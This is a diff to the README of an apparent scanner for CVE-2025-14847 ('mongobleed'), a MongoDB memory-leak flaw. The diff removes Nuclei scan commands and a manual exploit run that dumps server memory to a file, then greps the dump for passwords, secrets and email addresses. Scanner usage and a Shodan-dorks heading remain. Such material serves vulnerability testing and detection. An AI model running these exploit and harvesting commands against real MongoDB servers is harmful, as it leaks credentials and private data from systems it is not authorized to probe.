@@ -63,28 +63,6 @@ python3 mongobleed_scanner.py -H 192.168.1.100 --min-offset 20 --max-offset 2000
 python3 mongobleed_scanner.py --file mongodb_targets.txt --workers 20
 ```
 
-### Nuclei Template
-
-```bash
-# Scan single target
-nuclei -t CVE-2025-14847.yaml -u mongodb://target.com:27017
-
-# Bulk scan
-nuclei -t CVE-2025-14847.yaml -l mongodb_targets.txt
-```
-
-### Manual Testing with mongobleed.py
-
-```bash
-# Original exploit by Joe Desimone
-python3 mongobleed.py --host target.com --port 27017 --max-offset 8192 --output leaked.bin
-
-# Check for sensitive patterns
-strings leaked.bin | grep -i password
-strings leaked.bin | grep -i secret
-strings leaked.bin | grep -E '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
-```
-
 ## Detection
 
 ### Shodan Dorks
